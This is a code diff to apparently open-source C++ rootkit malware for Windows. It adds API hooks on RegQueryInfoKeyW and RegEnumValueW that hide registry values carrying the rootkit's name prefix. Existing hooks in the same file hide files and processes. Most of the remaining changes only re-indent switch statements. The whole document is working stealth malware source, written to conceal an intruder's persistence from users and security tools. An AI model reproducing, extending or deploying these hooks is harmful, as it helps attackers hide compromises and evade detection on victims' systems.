@@ -2,6 +2,8 @@
 
 Rootkit::NtQuerySystemInformation Rootkit::OriginalNtQuerySystemInformation;
 Rootkit::ZwQueryDirectoryFile Rootkit::OriginalZwQueryDirectoryFile;
+Rootkit::RegQueryInfoKeyW Rootkit::OriginalRegQueryInfoKeyW;
+Rootkit::RegEnumValueW Rootkit::OriginalRegEnumValueW;
 
 void Rootkit::Initialize()
 {
@@ -11,6 +13,8 @@ void Rootkit::Initialize()
 	{
 		MH_CreateHookApi(L"ntdll.dll", "ZwQueryDirectoryFile", HookedZwQueryDirectoryFile, (PVOID*)&OriginalZwQueryDirectoryFile);
 	}
+	MH_CreateHookApi(L"advapi32.dll", "RegQueryInfoKeyW", HookedRegQueryInfoKeyW, (PVOID*)&OriginalRegQueryInfoKeyW);
+	MH_CreateHookApi(L"advapi32.dll", "RegEnumValueW", HookedRegEnumValueW, (PVOID*)&OriginalRegEnumValueW);
 	MH_EnableHook(MH_ALL_HOOKS);
 }
 void Rootkit::DebugLog(wstring str)
@@ -83,67 +87,141 @@ NTSTATUS Rootkit::HookedZwQueryDirectoryFile(HANDLE fileHandle, HANDLE event, PI
 
 	return status;
 }
+NTSTATUS Rootkit::HookedRegQueryInfoKeyW(HKEY hKey, PWSTR pClass, PDWORD pcClass, PDWORD pReserved, PDWORD pcSubKeys, PDWORD pcMaxSubKeyLen, PDWORD pcMaxClassLen, PDWORD pcValues, PDWORD pcMaxValueNameLen, PDWORD pcMaxValueLen, PULONG pulSecDescLen, PFILETIME pftLastWriteTime)
+{
+	DWORD subKeyCount;
+	DWORD valueCount;
+	DWORD maxValueDataSize;
+	DWORD newValueCount = 0;
+
+	if (RegistryQueryInfoKey(hKey, subKeyCount, valueCount, maxValueDataSize) && valueCount > 0)
+	{
+		newValueCount = valueCount;
+		WCHAR name[16383];
+
+		for (DWORD i = 0; i < valueCount; i++)
+		{
+			DWORD nameSize = 16383;
+			name[0] = L'\0';
+			if (OriginalRegEnumValueW(hKey, i, name, &nameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
+			{
+				DWORD lpData = maxValueDataSize;
+				if (RegQueryValueExW(hKey, name, 0, NULL, NULL, NULL) == ERROR_SUCCESS && lstrlenW(name) > 0)
+				{
+					if (wstring(name).find(ROOTKIT_PREFIX) == 0)
+					{
+						newValueCount--;
+					}
+				}
+			}
+		}
+	}
+
+	return OriginalRegQueryInfoKeyW(hKey, pClass, pcClass, pReserved, pcSubKeys, pcMaxSubKeyLen, pcMaxClassLen, &newValueCount, pcMaxValueNameLen, pcMaxValueLen, pulSecDescLen, pftLastWriteTime);
+}
+NTSTATUS Rootkit::HookedRegEnumValueW(HKEY hKey, DWORD dwIndex, PWSTR pValueName, PDWORD pcchValueName, PDWORD pReserved, PDWORD pType, PBYTE pData, PDWORD pcbData)
+{
+	DWORD subKeyCount;
+	DWORD valueCount;
+	DWORD maxValueDataSize;
+
+	if (RegistryQueryInfoKey(hKey, subKeyCount, valueCount, maxValueDataSize) && valueCount > 0)
+	{
+		WCHAR name[16383];
+
+		for (DWORD i = 0; i < min(valueCount, dwIndex + 1); i++)
+		{
+			DWORD nameSize = 16383;
+			name[0] = L'\0';
+			if (OriginalRegEnumValueW(hKey, i, name, &nameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
+			{
+				DWORD lpData = maxValueDataSize;
+				if (RegQueryValueExW(hKey, name, 0, NULL, NULL, NULL) == ERROR_SUCCESS && lstrlenW(name) > 0)
+				{
+					if (wstring(name).find(ROOTKIT_PREFIX) == 0)
+					{
+						dwIndex++;
+					}
+				}
+			}
+		}
+	}
+
+	return OriginalRegEnumValueW(hKey, dwIndex, pValueName, pcchValueName, pReserved, pType, pData, pcbData);
+}
 WCHAR* Rootkit::GetFileDirEntryFileName(PVOID fileInformation, FileInformationClassEx fileInformationClass)
 {
 	switch (fileInformationClass)
 	{
-		case FileInformationClassEx::FileDirectoryInformation:
-			return ((FileDirectoryInformationEx*)fileInformation)->FileName;
-		case FileInformationClassEx::FileFullDirectoryInformation:
-			return ((FileFullDirInformationEx*)fileInformation)->FileName;
-		case FileInformationClassEx::FileIdFullDirectoryInformation:
-			return ((FileIdFullDirInformationEx*)fileInformation)->FileName;
-		case FileInformationClassEx::FileBothDirectoryInformation:
-			return ((FileBothDirInformationEx*)fileInformation)->FileName;
-		case FileInformationClassEx::FileIdBothDirectoryInformation:
-			return ((FileIdBothDirInformationEx*)fileInformation)->FileName;
-		case FileInformationClassEx::FileNamesInformation:
-			return ((FileNamesInformationEx*)fileInformation)->FileName;
-		default:
-			return NULL;
+	case FileInformationClassEx::FileDirectoryInformation:
+		return ((FileDirectoryInformationEx*)fileInformation)->FileName;
+	case FileInformationClassEx::FileFullDirectoryInformation:
+		return ((FileFullDirInformationEx*)fileInformation)->FileName;
+	case FileInformationClassEx::FileIdFullDirectoryInformation:
+		return ((FileIdFullDirInformationEx*)fileInformation)->FileName;
+	case FileInformationClassEx::FileBothDirectoryInformation:
+		return ((FileBothDirInformationEx*)fileInformation)->FileName;
+	case FileInformationClassEx::FileIdBothDirectoryInformation:
+		return ((FileIdBothDirInformationEx*)fileInformation)->FileName;
+	case FileInformationClassEx::FileNamesInformation:
+		return ((FileNamesInformationEx*)fileInformation)->FileName;
+	default:
+		return NULL;
 	}
 }
 ULONG Rootkit::GetFileNextEntryOffset(PVOID fileInformation, FileInformationClassEx fileInformationClass)
 {
 	switch (fileInformationClass)
 	{
-		case FileInformationClassEx::FileDirectoryInformation:
-			return ((FileDirectoryInformationEx*)fileInformation)->NextEntryOffset;
-		case FileInformationClassEx::FileFullDirectoryInformation:
-			return ((FileFullDirInformationEx*)fileInformation)->NextEntryOffset;
-		case FileInformationClassEx::FileIdFullDirectoryInformation:
-			return ((FileIdFullDirInformationEx*)fileInformation)->NextEntryOffset;
-		case FileInformationClassEx::FileBothDirectoryInformation:
-			return ((FileBothDirInformationEx*)fileInformation)->NextEntryOffset;
-		case FileInformationClassEx::FileIdBothDirectoryInformation:
-			return ((FileIdBothDirInformationEx*)fileInformation)->NextEntryOffset;
-		case FileInformationClassEx::FileNamesInformation:
-			return ((FileNamesInformationEx*)fileInformation)->NextEntryOffset;
-		default:
-			return 0;
+	case FileInformationClassEx::FileDirectoryInformation:
+		return ((FileDirectoryInformationEx*)fileInformation)->NextEntryOffset;
+	case FileInformationClassEx::FileFullDirectoryInformation:
+		return ((FileFullDirInformationEx*)fileInformation)->NextEntryOffset;
+	case FileInformationClassEx::FileIdFullDirectoryInformation:
+		return ((FileIdFullDirInformationEx*)fileInformation)->NextEntryOffset;
+	case FileInformationClassEx::FileBothDirectoryInformation:
+		return ((FileBothDirInformationEx*)fileInformation)->NextEntryOffset;
+	case FileInformationClassEx::FileIdBothDirectoryInformation:
+		return ((FileIdBothDirInformationEx*)fileInformation)->NextEntryOffset;
+	case FileInformationClassEx::FileNamesInformation:
+		return ((FileNamesInformationEx*)fileInformation)->NextEntryOffset;
+	default:
+		return 0;
 	}
 }
 void Rootkit::SetFileNextEntryOffset(PVOID fileInformation, FileInformationClassEx fileInformationClass, ULONG value)
 {
 	switch (fileInformationClass)
 	{
-		case FileInformationClassEx::FileDirectoryInformation:
-			((FileDirectoryInformationEx*)fileInformation)->NextEntryOffset = value;
-			break;
-		case FileInformationClassEx::FileFullDirectoryInformation:
-			((FileFullDirInformationEx*)fileInformation)->NextEntryOffset = value;
-			break;
-		case FileInformationClassEx::FileIdFullDirectoryInformation:
-			((FileIdFullDirInformationEx*)fileInformation)->NextEntryOffset = value;
-			break;
-		case FileInformationClassEx::FileBothDirectoryInformation:
-			((FileBothDirInformationEx*)fileInformation)->NextEntryOffset = value;
-			break;
-		case FileInformationClassEx::FileIdBothDirectoryInformation:
-			((FileIdBothDirInformationEx*)fileInformation)->NextEntryOffset = value;
-			break;
-		case FileInformationClassEx::FileNamesInformation:
-			((FileNamesInformationEx*)fileInformation)->NextEntryOffset = value;
-			break;
+	case FileInformationClassEx::FileDirectoryInformation:
+		((FileDirectoryInformationEx*)fileInformation)->NextEntryOffset = value;
+		break;
+	case FileInformationClassEx::FileFullDirectoryInformation:
+		((FileFullDirInformationEx*)fileInformation)->NextEntryOffset = value;
+		break;
+	case FileInformationClassEx::FileIdFullDirectoryInformation:
+		((FileIdFullDirInformationEx*)fileInformation)->NextEntryOffset = value;
+		break;
+	case FileInformationClassEx::FileBothDirectoryInformation:
+		((FileBothDirInformationEx*)fileInformation)->NextEntryOffset = value;
+		break;
+	case FileInformationClassEx::FileIdBothDirectoryInformation:
+		((FileIdBothDirInformationEx*)fileInformation)->NextEntryOffset = value;
+		break;
+	case FileInformationClassEx::FileNamesInformation:
+		((FileNamesInformationEx*)fileInformation)->NextEntryOffset = value;
+		break;
 	}
+}
+bool Rootkit::RegistryQueryInfoKey(HKEY hKey, DWORD &subKeyCount, DWORD &valueCount, DWORD &maxValueDataSize)
+{
+	WCHAR achClass[MAX_PATH] = L"";
+	DWORD classNameSize = MAX_PATH;
+	DWORD maxSubKeySize;
+	DWORD maxClassSize;
+	DWORD maxValueSize;
+	DWORD securityDescriptor;
+	FILETIME lastWriteTime;
+
+	return OriginalRegQueryInfoKeyW(hKey, achClass, &classNameSize, NULL, &subKeyCount, &maxSubKeySize, &maxClassSize, &valueCount, &maxValueSize, &maxValueDataSize, &securityDescriptor, &lastWriteTime) == ERROR_SUCCESS;
 }
